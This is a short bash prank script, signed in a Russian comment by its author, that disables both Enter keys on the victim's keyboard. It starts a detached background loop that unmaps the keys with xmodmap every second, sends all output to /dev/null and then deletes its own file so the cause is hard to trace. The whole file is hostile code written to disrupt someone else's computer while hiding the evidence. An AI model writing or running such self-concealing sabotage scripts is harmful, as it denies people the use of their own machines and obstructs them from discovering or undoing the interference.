#!/bin/bash

#Отключить на клавиатуре кнопку Enter 🥰💀 P.S: С любовью Bauka (basagitz)
nohup bash -c "
while true; do
  xmodmap -e 'keycode 36 ='
  xmodmap -e 'keycode 104 ='
  sleep 1
done
"  > /dev/null 2>&1 & disown
rm -- "$0"
